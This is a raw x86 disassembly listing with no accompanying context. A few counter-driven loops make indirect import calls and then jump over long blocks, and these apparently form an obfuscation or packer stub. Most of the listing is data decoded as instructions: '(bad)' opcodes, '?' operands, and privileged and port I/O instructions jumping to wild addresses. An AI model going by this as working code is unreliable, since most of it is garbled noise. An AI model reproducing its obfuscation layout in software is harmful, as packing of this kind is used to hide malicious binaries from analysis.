  40951e:	and    DWORD PTR ds:0x43367b,0x0
  409528:	jmp    0x409538
  40952d:	mov    eax,ds:0x43367b
  409532:	inc    eax
  409533:	mov    ds:0x43367b,eax
  409538:	cmp    DWORD PTR ds:0x43367b,0x11
  40953f:	jae    0x409578
  409545:	cmp    DWORD PTR ds:0x43367b,0x9
  40954c:	jne    0x40955b
  409552:	push   DWORD PTR [ebp-0x1c]
  409555:	call   DWORD PTR ds:0x412018
  40955b:	cmp    DWORD PTR ds:0x43367b,0x8
  409562:	jne    0x409573
  409568:	mov    eax,ds:0x43367b
  40956d:	inc    eax
  40956e:	mov    ds:0x43367b,eax
  409573:	jmp    0x40952d
  409578:	mov    eax,DWORD PTR [ebp-0x14]
  40957b:	sbb    ebx,0x50bb
  409581:	mov    ecx,DWORD PTR [ebp-0x20]
  409584:	xor    eax,esi
  409586:	and    ebx,0x1e7c
  40958c:	add    eax,edi
  40958e:	sub    DWORD PTR ds:0x4336b7,ecx
  409594:	mov    DWORD PTR [ecx],eax
  409596:	or     ebx,ebx
  409598:	mov    eax,ds:0x413cb2
  40959d:	mov    ebx,0x8e12feb8
  4095a2:	mov    DWORD PTR [ebp-0xc],ebx
  4095a5:	xor    DWORD PTR ds:0x433623,0x433613
  4095af:	mov    eax,DWORD PTR [eax]
  4095b1:	and    DWORD PTR ds:0x433633,0x43372f
  4095bb:	mov    cx,WORD PTR [ebp-0x4]
  4095bf:	jmp    0x4098e0
  4095c4:	jge    0x40957b
  4095c6:	mov    edx,0x397172fe
  4095cb:	mov    ch,0x54
  4095cd:	ds sbb eax,0x9ced400b
  4095d3:	aaa    
  4095d4:	ins    BYTE PTR es:[edi],dx
  4095d5:	fnstcw WORD PTR [esi+0x7e]
  4095d8:	jp     0x409657
  4095da:	jle    0x40965a
  4095dc:	aas    
  4095dd:	inc    edi
  4095de:	and    al,0xa
  4095e0:	mov    eax,0xb17588f1
  4095e5:	inc    edi
  4095e6:	push   ebp
  4095e7:	in     al,0x5c
  4095e9:	sahf   
  4095ea:	test   BYTE PTR [edx-0x5d410f65],cl
  4095f0:	xor    bh,BYTE PTR [ebp+ebx*8+0x207c7591]
  4095f7:	push   edx
  4095f8:	cmp    edi,DWORD PTR [edx]
  4095fa:	pop    edi
  4095fb:	mov    ?,esi
  4095fd:	add    DWORD PTR [edi+0x3b124862],esi
  409603:	ss cmp eax,0xbcf98524
  409609:	sbb    bl,ah
  40960b:	xchg   edi,eax
  40960c:	fcmovnu st,st(4)
  40960e:	(bad)  [edx]
  409610:	call   0x863671c6
  409615:	cmp    eax,0x430eb31b
  40961a:	inc    eax
  40961b:	or     ebx,edx
  40961d:	loopne 0x409600
  40961f:	and    ch,BYTE PTR [edi]
  409621:	sub    eax,0x5a135b2c
  409626:	xor    bh,ch
  409628:	daa    
  409629:	ss pop eax
  40962b:	imul   esp,DWORD PTR [edx],0x7ca57a9f
  409631:	mov    eax,ds:0x7c30ba60
  409636:	cmp    ecx,DWORD PTR [edi]
  409638:	and    DWORD PTR [edi+0x298c5475],edx
  40963e:	or     ah,BYTE PTR [eax+0x29]
  409641:	or     esp,DWORD PTR [ebp-0x15ea9745]
  409647:	dec    edx
  409648:	xchg   esi,eax
  409649:	repnz and BYTE PTR [ecx],dl
  40964c:	loopne 0x409661
  40964e:	jmp    0x409657
  409650:	pop    ebp
  409651:	leave  
  409652:	imul   ebp,DWORD PTR [edx],0x38
  409655:	sbb    eax,0x7f74762
  40965a:	fnstsw WORD PTR [edx-0x7f]
  40965d:	add    ecx,DWORD PTR [edi]
  40965f:	arpl   bx,bp
  409661:	sbb    DWORD PTR [ecx],esp
  409663:	gs mov esp,0xce083de6
  409669:	xor    dh,BYTE PTR [esi+0x3f]
  40966c:	sbb    esi,DWORD PTR [edi-0x63]
  40966f:	ins    DWORD PTR es:[edi],dx
  409670:	and    eax,0xfc2dcc71
  409675:	fistp  QWORD PTR [ebx]
  409677:	rcr    DWORD PTR [edx+ecx*8],1
  40967a:	jae    0x4096f3
  40967c:	inc    esp
  40967d:	repz gs retf 0xd37c
  409682:	mov    esi,0x444938f0
  409687:	push   ss
  409688:	call   0x273a9941
  40968d:	mov    cl,0xd9
  40968f:	adc    eax,ecx
  409691:	pop    esp
  409692:	cli    
  409693:	dec    ecx
  409694:	dec    esp
  409695:	mul    DWORD PTR [ecx+0x2be42635]
  40969b:	fstp   QWORD PTR [esi+eiz*1]
  40969e:	mov    ds:0xf74aeda9,al
  4096a3:	adc    al,0x5
  4096a5:	push   es
  4096a6:	push   ebp
  4096a7:	scas   eax,DWORD PTR es:[edi]
  4096a8:	xor    al,0x39
  4096aa:	aam    0x7a
  4096ac:	inc    edi
  4096ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096ae:	lods   al,BYTE PTR ds:[esi]
  4096af:	mov    ch,0xfa
  4096b1:	push   eax
  4096b2:	jge    0x409702
  4096b4:	xlat   BYTE PTR ds:[ebx]
  4096b5:	pusha  
  4096b6:	in     eax,0xa7
  4096b8:	aaa    
  4096b9:	fwait
  4096ba:	and    bh,dh
  4096bc:	mov    ebx,0x3e95ae80
  4096c1:	push   edi
  4096c2:	mov    ah,BYTE PTR [edx-0x29c18cb2]
  4096c8:	mov    ebx,0xadcb5076
  4096cd:	xlat   BYTE PTR ds:[ebx]
  4096ce:	lahf   
  4096cf:	in     eax,dx
  4096d0:	xchg   ebp,eax
  4096d1:	add    eax,0xd0ef91e2
  4096d6:	xchg   BYTE PTR [esi],cl
  4096d8:	ja     0x409735
  4096da:	es cmp eax,0x4ef45a3a
  4096e0:	lea    eax,[eax+0x53]
  4096e3:	mov    ds:0x65fc8858,eax
  4096e8:	push   esp
  4096e9:	test   eax,0x9ab9b14a
  4096ee:	(bad)  
  4096ef:	mov    dh,0xa1
  4096f1:	inc    esi
  4096f2:	cmp    eax,0xf65a8f33
  4096f7:	ficomp DWORD PTR [edi+edi*2]
  4096fa:	loopne 0x409699
  4096fc:	xchg   BYTE PTR [esi],bh
  4096fe:	mov    esp,0xd871816b
  409703:	das    
  409704:	ins    BYTE PTR es:[edi],dx
  409705:	xchg   ecx,eax
  409706:	dec    esp
  409707:	outs   dx,DWORD PTR ds:[esi]
  409708:	and    al,0x94
  40970a:	popf   
  40970b:	inc    eax
  40970c:	sub    BYTE PTR [eax],dl
  40970e:	nop
  40970f:	ret    0x1152
  409712:	scas   al,BYTE PTR es:[edi]
  409713:	pop    esi
  409714:	cmp    BYTE PTR [eax+eiz*2],ch
  409717:	lds    ecx,FWORD PTR es:[esi]
  40971a:	shl    DWORD PTR [ebp-0x2d],cl
  40971d:	cmp    eax,0x8d41c569
  409722:	mov    ah,0x18
  409724:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409725:	push   0x608ea87e
  40972a:	sbb    ch,ah
  40972c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40972d:	sub    BYTE PTR [ebp+0x699ffaf],bh
  409733:	pop    eax
  409734:	pop    ds
  409735:	shl    BYTE PTR [eax-0x5ef61433],1
  40973b:	adc    al,0x95
  40973d:	out    0x26,eax
  40973f:	rol    WORD PTR es:[ebx],0x8e
  409744:	adc    esp,ebp
  409746:	or     dl,BYTE PTR [ecx]
  409748:	dec    ebp
  409749:	fiadd  DWORD PTR [esi]
  40974b:	xor    BYTE PTR [edi],bl
  40974d:	loopne 0x409759
  40974f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409750:	je     0x409723
  409752:	les    edx,FWORD PTR [eax+eiz*4-0x1a]
  409756:	push   0xffffffdf
  409758:	sti    
  409759:	aas    
  40975a:	iret   
  40975b:	push   eax
  40975c:	add    BYTE PTR [ebp+0x79ac692a],bl
  409762:	mov    ecx,0x345ddf7b
  409767:	dec    esp
  409768:	inc    DWORD PTR ds:0x4e55883e
  40976e:	mov    cl,0xb2
  409770:	ja     0x409779
  409772:	ins    DWORD PTR es:[edi],dx
  409773:	pop    esi
  409774:	xor    esp,DWORD PTR [ebp-0x44]
  409777:	xor    al,0x7c
  409779:	xchg   esi,eax
  40977a:	idiv   BYTE PTR [edi+esi*1-0x12]
  40977e:	inc    ebx
  40977f:	popf   
  409780:	dec    eax
  409781:	fbld   TBYTE PTR [esi]
  409783:	in     al,0x92
  409785:	fs stos DWORD PTR es:[edi],eax
  409787:	xor    esp,DWORD PTR [ecx+0x5]
  40978a:	xchg   ebp,eax
  40978b:	mov    ch,0x69
  40978d:	ficom  DWORD PTR [edx]
  40978f:	adc    al,0xcb
  409791:	sbb    al,0xee
  409793:	daa    
  409794:	push   cs
  409795:	jns    0x4097e8
  409797:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409798:	pop    ebx
  409799:	push   ss
  40979a:	sahf   
  40979b:	jns    0x409756
  40979d:	lods   eax,DWORD PTR ds:[esi]
  40979e:	rol    DWORD PTR [ebx-0x33],0xbe
  4097a2:	xchg   esi,eax
  4097a3:	pop    esp
  4097a4:	add    DWORD PTR [ebx-0x44],0x74
  4097a8:	or     DWORD PTR [esi-0x3fb50a14],eax
  4097ae:	loope  0x40974c
  4097b0:	pop    ss
  4097b1:	test   eax,0x73d40a44
  4097b6:	xchg   ebx,eax
  4097b7:	pop    es
  4097b8:	fwait
  4097b9:	lahf   
  4097ba:	mov    bl,0xbd
  4097bc:	mov    ecx,0xa1ef1cec
  4097c1:	and    DWORD PTR [esi],esp
  4097c3:	or     DWORD PTR [ebx-0x21ae326],edi
  4097c9:	mov    dh,ah
  4097cb:	inc    ebp
  4097cc:	pop    edx
  4097cd:	das    
  4097ce:	daa    
  4097cf:	push   edx
  4097d0:	shl    DWORD PTR [esp+ebx*1],cl
  4097d3:	xchg   esi,eax
  4097d4:	mov    ecx,?
  4097d6:	icebp  
  4097d7:	xor    eax,0x26c790a3
  4097dc:	adc    DWORD PTR [edi+0x90b93fe],esp
  4097e2:	jns    0x409775
  4097e4:	jmp    0x8dbbec54
  4097e9:	das    
  4097ea:	icebp  
  4097eb:	jno    0x4097fe
  4097ed:	scas   al,BYTE PTR es:[edi]
  4097ee:	int3   
  4097ef:	aam    0x74
  4097f1:	adc    esp,esp
  4097f3:	add    eax,0x79315f67
  4097f8:	and    ebp,eax
  4097fa:	test   BYTE PTR [ecx+ecx*4],0xc7
  4097fe:	xor    eax,DWORD PTR [ebp-0x78b90b5b]
  409804:	add    eax,0x459ed220
  409809:	mov    dh,BYTE PTR [ebx]
  40980b:	outs   dx,DWORD PTR ds:[esi]
  40980c:	mov    bl,0xcd
  40980e:	scas   al,BYTE PTR es:[edi]
  40980f:	scas   al,BYTE PTR es:[edi]
  409810:	pop    edi
  409811:	es xor al,ch
  409814:	add    esp,DWORD PTR [eax+0x6a5bc941]
  40981a:	in     al,dx
  40981b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40981c:	pop    esi
  40981d:	lds    ecx,FWORD PTR [ebx+ecx*1+0x41]
  409821:	xchg   ecx,eax
  409822:	sar    BYTE PTR [ecx+0x7d],1
  409825:	push   es
  409826:	mov    ebp,0x3a533592
  40982b:	jmp    0x3a37:0x44456bc4
  409832:	rol    BYTE PTR [edx],cl
  409834:	and    al,0x8e
  409836:	mov    edi,0x2e7332e
  40983b:	das    
  40983c:	or     DWORD PTR [eax+0xf],esp
  40983f:	push   0xccc21ae3
  409844:	jmp    0x661:0x2e6f9808
  40984b:	push   edx
  40984c:	xor    bh,BYTE PTR [esi-0x4]
  40984f:	mov    ah,0x22
  409851:	ror    BYTE PTR [esp],1
  409854:	(bad)  
  409855:	mov    dh,0x17
  409857:	ins    BYTE PTR es:[edi],dx
  409858:	retf   0xde75
  40985b:	xchg   ecx,eax
  40985c:	and    esi,ebp
  40985e:	adc    eax,0xb2895e53
  409863:	inc    edi
  409864:	rol    DWORD PTR [eax+0x25247676],cl
  40986a:	or     dl,BYTE PTR [ecx+0x126ee0a2]
  409870:	add    al,0x80
  409872:	mov    cs,WORD PTR [edx-0x11bf20be]
  409878:	fmul   st(5),st
  40987a:	sahf   
  40987b:	les    esi,FWORD PTR [edx+0x61799afc]
  409881:	and    BYTE PTR ds:0x7a19fbe5,bl
  409887:	ret    
  409888:	inc    ebp
  409889:	mov    edi,edi
  40988b:	pop    edi
  40988c:	ins    DWORD PTR es:[edi],dx
  40988d:	pop    esi
  40988e:	jmp    0xcfc4bd6b
  409893:	into   
  409894:	or     ecx,DWORD PTR [esi]
  409896:	dec    ebp
  409897:	jp     0x4098d5
  409899:	add    al,BYTE PTR [ecx-0x59]
  40989c:	add    ch,BYTE PTR [ebp+0x11]
  40989f:	mov    DWORD PTR [esi-0x13],esp
  4098a2:	add    al,0xc0
  4098a4:	or     BYTE PTR [ecx+0x28],0xad
  4098a8:	sbb    al,0x5d
  4098aa:	sbb    al,0x69
  4098ac:	mov    al,0x9b
  4098ae:	out    dx,al
  4098af:	xchg   ebp,eax
  4098b0:	loope  0x4098b0
  4098b2:	xchg   ebp,eax
  4098b3:	bound  esi,QWORD PTR [ebp-0x7a]
  4098b6:	aaa    
  4098b7:	test   DWORD PTR [esi+0x47],esi
  4098ba:	and    al,0x9a
  4098bc:	mov    dh,0x82
  4098be:	mov    bh,0xf
  4098c0:	nop
  4098c1:	rcr    BYTE PTR [ebp+0x54],0xa0
  4098c5:	cmp    ebp,DWORD PTR ds:0xde93257c
  4098cb:	(bad)  
  4098cc:	icebp  
  4098cd:	popa   
  4098ce:	clc    
  4098cf:	inc    esi
  4098d0:	jbe    0x4098a6
  4098d2:	mov    ebx,0xb19bb1f1
  4098d7:	les    ecx,FWORD PTR [ebx]
  4098d9:	pop    esi
  4098da:	pop    esi
  4098db:	addr16 inc edx
  4098dd:	inc    esi
  4098de:	gs aam 0xf
  4098e1:	mov    bh,0xc9
  4098e3:	sbb    DWORD PTR ds:0x43373b,0x5a23
  4098ed:	add    ecx,DWORD PTR [eax]
  4098ef:	adc    DWORD PTR ds:0x4336a7,ebx
  4098f5:	mov    DWORD PTR [ebp-0x18],ecx
  4098f8:	and    eax,DWORD PTR ds:0x433637
  4098fe:	mov    eax,DWORD PTR [ebp+0x8]
  409901:	and    DWORD PTR ds:0x43366f,0x0
  40990b:	mov    ecx,DWORD PTR ds:0x43366f
  409911:	inc    ecx
  409912:	mov    DWORD PTR ds:0x43366f,ecx
  409918:	cmp    DWORD PTR ds:0x43366f,0x2e
  40991f:	jne    0x409933
  409925:	push   DWORD PTR [ebp-0x24]
  409928:	push   0x2be2
  40992d:	call   DWORD PTR ds:0x41201c
  409933:	cmp    DWORD PTR ds:0x43366f,0x1f
  40993a:	jb     0x40990b
  409940:	mov    DWORD PTR ds:0x4336a7,0x11
  40994a:	cmp    DWORD PTR ds:0x4336a7,0x0
  409951:	je     0x4099a3
  409957:	cmp    DWORD PTR ds:0x4336a7,0x6
  40995e:	jne    0x409977
  409964:	push   0x4337a4
  409969:	push   DWORD PTR [ebp-0x24]
  40996c:	push   0x64fc
  409971:	call   DWORD PTR ds:0x4121d0
  409977:	cmp    DWORD PTR ds:0x4336a7,0x7
  40997e:	jne    0x409991
  409984:	mov    ecx,DWORD PTR ds:0x4336a7
  40998a:	dec    ecx
  40998b:	mov    DWORD PTR ds:0x4336a7,ecx
  409991:	mov    ecx,DWORD PTR ds:0x4336a7
  409997:	dec    ecx
  409998:	mov    DWORD PTR ds:0x4336a7,ecx
  40999e:	jmp    0x40994a
  4099a3:	mov    ecx,DWORD PTR [ebp-0x8]
  4099a6:	xor    eax,esi
  4099a8:	add    eax,edi
  4099aa:	cmp    DWORD PTR [ecx],eax
  4099ac:	jmp    0x409ccd
  4099b1:	cmovbe ebx,DWORD PTR [esi+0x55e577e5]
  4099b8:	je     0x4099d6
  4099ba:	dec    edi
  4099bb:	cmc    
  4099bc:	fstp   QWORD PTR [edx+0x1a]
  4099bf:	mov    esp,0x7ee468ff
  4099c4:	jle    0x409a40
  4099c6:	jge    0x409a46
  4099c8:	jle    0x4099ed
  4099ca:	or     eax,0x133d4fb1
  4099cf:	pushf  
  4099d0:	lods   eax,DWORD PTR ds:[esi]
  4099d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099d2:	xor    DWORD PTR [ebx+eax*2-0x6f],0x956b36a2
  4099da:	fcmovne st,st(1)
  4099dc:	cmp    ecx,DWORD PTR [ecx+0x9c1d781]
  4099e2:	xor    al,0x77
  4099e4:	mov    ebx,0x93dda944
  4099e9:	sub    ebp,edx
  4099eb:	sub    ecx,esp
  4099ed:	mov    al,ds:0xf66779e2
  4099f2:	(bad)  
  4099f3:	sbb    DWORD PTR [ebx+0x7e3486a],eax
  4099f9:	jo     0x409983
  4099fb:	xchg   ebx,eax
  4099fc:	sbb    eax,0x4204fc53
  409a01:	cs sti 
  409a03:	mov    ebp,0x3a76d41
  409a08:	outs   dx,DWORD PTR ds:[esi]
  409a09:	xlat   BYTE PTR ds:[ebx]
  409a0a:	push   edi
  409a0b:	jg     0x409a7e
  409a0d:	add    BYTE PTR [edx+eiz*4+0x4dbd5c49],0xbe
  409a15:	pop    esi
  409a16:	xor    DWORD PTR [ecx+0x37],ebp
  409a19:	xor    al,0x14
  409a1b:	jmp    0x7168b2a4
  409a20:	loopne 0x4099c4
  409a22:	lds    ebp,FWORD PTR [eax-0x8]
  409a25:	outs   dx,DWORD PTR ds:[esi]
  409a26:	xlat   BYTE PTR ds:[ebx]
  409a27:	cld    
  409a28:	aas    
  409a29:	mov    ebp,0x19052335
  409a2e:	sbb    BYTE PTR [ebx+0x6b],bh
  409a31:	jmp    FWORD PTR [edx]
  409a33:	or     BYTE PTR [ebx+0x16],cl
  409a36:	dec    ebp
  409a37:	dec    ecx
  409a38:	in     al,0x12
  409a3a:	iret   
  409a3b:	xor    al,0xf4
  409a3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a3e:	dec    esi
  409a3f:	xchg   DWORD PTR [edi-0x7c],edi
  409a42:	loop   0x4099ed
  409a44:	adc    esi,DWORD PTR [edx+0x7]
  409a47:	inc    edi
  409a48:	sbb    DWORD PTR fs:[edx+0xb],ebx
  409a4c:	dec    ebx
  409a4d:	or     dl,0x67
  409a50:	jns    0x409a06
  409a52:	sub    eax,0x173ea2a2
  409a57:	test   BYTE PTR [edx],ch
  409a59:	mov    esp,0x4d31748d
  409a5e:	pop    ecx
  409a5f:	push   ds
  409a60:	push   esi
  409a61:	inc    ebx
  409a62:	jns    0x409a0c
  409a64:	aaa    
  409a65:	inc    ecx
  409a66:	xchg   BYTE PTR [edi-0x28a8bcf8],cl
  409a6c:	adc    eax,0xafe1c358
  409a71:	nop
  409a72:	xlat   BYTE PTR ds:[ebx]
  409a73:	rol    BYTE PTR [ebx-0x14],1
  409a76:	lahf   
  409a77:	add    al,0xcf
  409a79:	sbb    al,0xeb
  409a7b:	shl    BYTE PTR [edi+0x43],cl
  409a7e:	cmp    DWORD PTR [ebp+0x7f1441d2],0x700f8c36
  409a88:	adc    al,0x71
  409a8a:	xor    BYTE PTR [edx-0x23],dl
  409a8d:	pop    ds
  409a8e:	dec    edi
  409a8f:	mov    bl,0xf0
  409a91:	push   0xffffffa1
  409a93:	ins    BYTE PTR es:[edi],dx
  409a94:	sti    
  409a95:	out    0x91,al
  409a97:	(bad)  
  409a98:	(bad)  
  409a99:	sub    eax,0x3ad125fc
  409a9e:	lahf   
  409a9f:	xor    ecx,DWORD PTR [edi-0x44a0e31a]
  409aa5:	out    dx,eax
  409aa6:	ja     0x409a81
  409aa8:	and    bh,bh
  409aaa:	adc    BYTE PTR [ecx+0x5],bh
  409aad:	aas    
  409aae:	or     al,0x8a
  409ab0:	retf   
  409ab1:	push   eax
  409ab2:	outs   dx,BYTE PTR ds:[esi]
  409ab3:	sar    BYTE PTR [ebx+0x4bbdeaa1],1
  409ab9:	sets   BYTE PTR [ecx+0x1a]
  409abd:	scas   eax,DWORD PTR es:[edi]
  409abe:	jge    0x409b2f
  409ac0:	and    eax,DWORD PTR [edx-0x1bb32948]
  409ac6:	aas    
  409ac7:	inc    eax
  409ac8:	mov    ah,0xca
  409aca:	xchg   ebx,eax
  409acb:	jecxz  0x409abb
  409acd:	inc    ebp
  409ace:	pushf  
  409acf:	add    DWORD PTR [edi],esi
  409ad1:	or     eax,0x75521546
  409ad6:	aaa    
  409ad7:	inc    esp
  409ad8:	pop    esp
  409ad9:	bound  edx,QWORD PTR [edx-0x2a79668b]
  409adf:	inc    eax
  409ae0:	ja     0x409b40
  409ae2:	call   0x9c30ab24
  409ae7:	mov    eax,0xc1662cd6
  409aec:	test   al,0x89
  409aee:	or     eax,0x69d050b8
  409af3:	pop    eax
  409af4:	es pop esp
  409af6:	xor    ch,bh
  409af8:	mov    ss,WORD PTR [eax]
  409afa:	xor    al,0xe0
  409afc:	sub    ch,BYTE PTR [edi+0x706cf9d7]
  409b02:	jecxz  0x409b42
  409b04:	cmp    ch,BYTE PTR [ebx]
  409b06:	daa    
  409b07:	in     al,0x4
  409b09:	mov    DWORD PTR [edx+0x5ef3d832],edx
  409b0f:	repnz pop esi
  409b11:	in     al,0xe6
  409b13:	sbb    BYTE PTR [edx+0x67109926],ah
  409b19:	outs   dx,BYTE PTR ds:[esi]
  409b1a:	cmp    eax,DWORD PTR ss:[esp+ebx*2]
  409b1e:	div    BYTE PTR [edi*2-0x5a1eff9a]
  409b25:	sbb    al,0x69
  409b27:	cmc    
  409b28:	ds mov ecx,0x69d270f3
  409b2e:	rcr    dl,0xbe
  409b31:	inc    ecx
  409b32:	adc    DWORD PTR [edx],0x8267421c
  409b38:	call   0xfd2950b6
  409b3d:	mov    al,ds:0xee1e76ad
  409b42:	xchg   edi,eax
  409b43:	push   ebp
  409b44:	fwait
  409b45:	mov    al,ds:0x80db3246
  409b4a:	fld    st(3)
  409b4c:	outs   dx,BYTE PTR fs:[esi]
  409b4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b4f:	adc    edx,edx
  409b51:	out    dx,eax
  409b52:	mov    esi,0xac107329
  409b57:	push   esi
  409b58:	call   0xf31d1944
  409b5d:	pop    eax
  409b5e:	xchg   edi,eax
  409b5f:	fiadd  DWORD PTR [ecx+eiz*1]
  409b62:	into   
  409b63:	mov    ds:0xf02d0203,al
  409b68:	(bad)  
  409b6a:	mov    ecx,0x81cef1d4
  409b6f:	pop    edx
  409b70:	push   eax
  409b71:	push   eax
  409b72:	idiv   BYTE PTR [edi]
  409b74:	icebp  
  409b75:	sub    al,BYTE PTR [esi+0x20]
  409b78:	or     BYTE PTR [ecx-0x7a82f99c],0x48
  409b7f:	out    0xc8,eax
  409b81:	jmp    0x9e245161
  409b86:	test   DWORD PTR [bp+di],edi
  409b89:	mov    esi,0xb1aba9ee
  409b8e:	push   edx
  409b8f:	lea    ebp,[edx-0x5]
  409b92:	(bad)  
  409b93:	sti    
  409b94:	iret   
  409b95:	cmp    dl,BYTE PTR [esi-0x10]
  409b98:	stos   BYTE PTR es:[edi],al
  409b99:	enter  0x9b4a,0xd1
  409b9d:	data16 aad 0x3c
  409ba0:	or     DWORD PTR [ecx],ebp
  409ba2:	mov    gs,WORD PTR [ecx-0x61f4a6a3]
  409ba8:	test   eax,0xad857885
  409bad:	mov    eax,gs
  409baf:	in     eax,0x99
  409bb1:	adc    DWORD PTR [esi-0x21f7fd2c],0xffffff99
  409bb8:	xor    eax,0xec04b518
  409bbd:	sbb    DWORD PTR [ebp+0x1],edi
  409bc0:	ret    
  409bc1:	mov    bh,0xff
  409bc3:	leave  
  409bc4:	xor    DWORD PTR [edx],esp
  409bc6:	pop    ss
  409bc7:	int3   
  409bc8:	mov    DWORD PTR [ebp-0x5108f5db],edi
  409bce:	test   BYTE PTR [ebx+ecx*8-0x4],dl
  409bd2:	mov    esp,0x947dfc30
  409bd7:	and    eax,0xbad6a2d5
  409bdc:	jge    0x409bb5
  409bde:	jnp    0x409c39
  409be0:	sub    BYTE PTR [eax],bh
  409be2:	add    DWORD PTR [ebx+ecx*2],eax
  409be5:	push   ebp
  409be6:	push   edi
  409be7:	or     al,0xa8
  409be9:	(bad)  
  409bea:	mov    cs,WORD PTR [esp+ebp*2+0x76451ecf]
  409bf1:	or     BYTE PTR [ebx+eiz*8-0x2e8842ff],ch
  409bf8:	lds    ebp,FWORD PTR [eax]
  409bfa:	ds sti 
  409bfc:	je     0x409bbd
  409bfe:	push   es
  409bff:	jmp    0xb6d3:0x10d0656b
  409c06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c07:	es push ds
  409c09:	dec    ebp
  409c0a:	sahf   
  409c0b:	mov    ds:0x31747314,eax
  409c10:	cwde   
  409c11:	push   edi
  409c12:	sbb    al,0xc5
  409c14:	or     ebp,esi
  409c16:	push   ebp
  409c17:	mov    esi,0x869fa824
  409c1c:	or     bh,al
  409c1e:	mov    dh,0xf0
  409c20:	push   esp
  409c21:	jmp    0x409bcc
  409c23:	scas   eax,DWORD PTR es:[edi]
  409c24:	pop    es
  409c25:	pop    ecx
  409c26:	or     esp,DWORD PTR [edi]
  409c28:	jp     0x409bd5
  409c2a:	sub    BYTE PTR [ecx+0x6f2c6f8b],cl
  409c30:	sub    DWORD PTR [ecx-0x36],edi
  409c33:	sar    DWORD PTR [ecx+0x789f5853],cl
  409c39:	lock pop ss
  409c3b:	sbb    bl,ah
  409c3d:	mov    al,ds:0xfdd3f4a6
  409c42:	lds    eax,FWORD PTR [ebp+ecx*8+0x70f6124f]
  409c49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c4a:	retf   0xedb9
  409c4d:	sbb    ah,BYTE PTR [edi+0x3e29caf5]
  409c53:	loop   0x409c9f
  409c55:	test   bl,0xdb
  409c58:	cmp    eax,0xf5a4998f
  409c5d:	sub    eax,ecx
  409c5f:	or     al,0xe5
  409c61:	pop    esi
  409c62:	xchg   BYTE PTR [ebp-0x13a15f5e],dl
  409c68:	xor    DWORD PTR [eax-0x40897ba],ebx
  409c6e:	popf   
  409c6f:	test   al,0x80
  409c71:	mov    ebp,0x354deb2c
  409c76:	mov    ecx,0xef6b466d
  409c7b:	arpl   sp,sp
  409c7d:	xchg   ebx,eax
  409c7e:	imul   ebp,DWORD PTR [ecx+0x22],0xb81c0734
  409c85:	lock repnz nop
  409c88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c89:	sbb    eax,0xa9b974d5
  409c8e:	cmc    
  409c8f:	mov    ecx,0x3f5ad1f8
  409c94:	sbb    edx,DWORD PTR [edx+0x62f9112c]
  409c9a:	mov    dl,bh
  409c9c:	inc    esp
  409c9d:	dec    edi
  409c9e:	add    ecx,eax
  409ca0:	mov    edi,0x349b3041
  409ca5:	or     ebp,edx
  409ca7:	daa    
  409ca8:	pop    esp
  409ca9:	imul   esi,DWORD PTR [ebp+0x2f54fbda],0x4979032b
  409cb3:	mov    dl,0xdf
  409cb5:	cmp    bh,BYTE PTR [edx-0xf]
  409cb8:	scas   eax,DWORD PTR es:[edi]
  409cb9:	inc    esi
  409cba:	les    ebp,FWORD PTR [ebx+eax*8]
  409cbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cbe:	push   cs
  409cbf:	dec    eax
  409cc0:	and    al,0x1e
  409cc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409cc3:	push   ebx
  409cc4:	inc    ecx
  409cc5:	rcr    BYTE PTR [esi],1
  409cc7:	fnstsw WORD PTR [eax+0x47]
  409cca:	cmp    eax,0x850f847f
  409ccf:	mov    BYTE PTR [esi],0x0
  409cd2:	add    BYTE PTR [ebx+0x4d8b0845],cl
  409cd8:	call   0xc7446310
  409cdd:	cmp    DWORD PTR [ecx],eax
  409cdf:	jne    0x40a344
  409ce5:	mov    eax,DWORD PTR [ebp+0x8]
  409ce8:	jmp    0x40a009
  409ced:	inc    edi
  409cee:	aad    0xe6
  409cf0:	shl    BYTE PTR [ecx+esi*8+0x71],1
  409cf4:	push   ecx
  409cf5:	out    0xaa,eax
  409cf7:	push   esp
  409cf8:	stc    
  409cf9:	xor    al,0x2
  409cfb:	int    0x11
  409cfd:	je     0x409ce2
  409cff:	jle    0x409d7f
  409d01:	jp     0x409d80
  409d03:	jle    0x409d83
  409d05:	scas   eax,DWORD PTR es:[edi]
  409d06:	jl     0x409d21
  409d08:	daa    
  409d09:	mov    esi,0x4c55a9b0
  409d0e:	or     eax,0xb2cfe525
  409d13:	stc    
  409d14:	dec    ebx
  409d15:	add    DWORD PTR [ecx+0x7eacc0e5],0xd206f2f8
  409d1f:	loope  0x409d61
  409d21:	adc    al,0xf3
  409d23:	jl     0x409cf2
  409d25:	repz adc al,0x39
  409d28:	cdq    
  409d29:	and    al,0x22
  409d2b:	xchg   ebx,eax
  409d2c:	jne    0x409cbe
  409d2e:	sub    eax,0xb2f02ee2
  409d33:	xlat   BYTE PTR ds:[ebx]
  409d34:	(bad)  
  409d35:	mov    ah,0xdc
  409d37:	fld    DWORD PTR [ebx-0x50]
  409d3a:	(bad)  
  409d3b:	jb     0x409d1c
  409d3d:	in     eax,0xd1
  409d3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d40:	mov    dl,0xd4
  409d42:	dec    edi
  409d43:	sahf   
  409d44:	data16 das 
  409d46:	pushf  
  409d47:	add    al,0x44
  409d49:	outs   dx,DWORD PTR ds:[esi]
  409d4a:	pop    edi
  409d4b:	sbb    esp,DWORD PTR [edi+0x42d88952]
  409d51:	stos   DWORD PTR es:[edi],eax
  409d52:	scas   eax,DWORD PTR es:[edi]
  409d53:	pushf  
  409d54:	pop    ds
  409d55:	je     0x409cda
  409d57:	xchg   edx,eax
  409d58:	cld    
  409d59:	and    DWORD PTR [esi-0x6d44d069],0xb2e72fa0
  409d63:	stc    
